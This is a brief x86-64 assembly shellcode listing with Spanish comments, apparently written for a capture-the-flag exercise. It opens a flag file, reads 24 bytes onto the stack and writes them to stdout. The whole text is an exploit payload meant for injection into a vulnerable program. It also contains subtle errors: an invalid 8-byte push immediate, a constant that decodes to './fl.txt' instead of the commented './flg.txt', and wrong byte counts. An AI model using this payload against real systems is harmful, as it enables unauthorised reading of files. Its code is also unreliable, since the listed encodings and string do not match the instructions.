global _start

section .text
_start:
    ; push './flg.txt\x00'
    push 0x7478742E6C662F2E  ; "./flg.txt" en hexadecimal (8 bytes)

    ; open('rsp', 'O_RDONLY')
    mov rdi, rsp         ; 3 bytes (48 89 E7)
    mov al, 2            ; 2 bytes (B0 02) -> 'open' syscall
    xor esi, esi         ; 2 bytes (31 F6)
    syscall

    ; read file
    mov edi, eax         ; 2 bytes (89 C7) -> fd devuelto por 'open'
    xor eax, eax         ; 2 bytes (31 C0) -> 'read' syscall
    mov rsi, rsp         ; 3 bytes (48 89 E6)
    mov dl, 24           ; 2 bytes (B2 18)
    syscall

    ; write output
    mov edi, 1           ; 2 bytes (BF 01)
    mov al, 1            ; 2 bytes (B0 01) -> 'write' syscall
    syscall

    ; exit retirado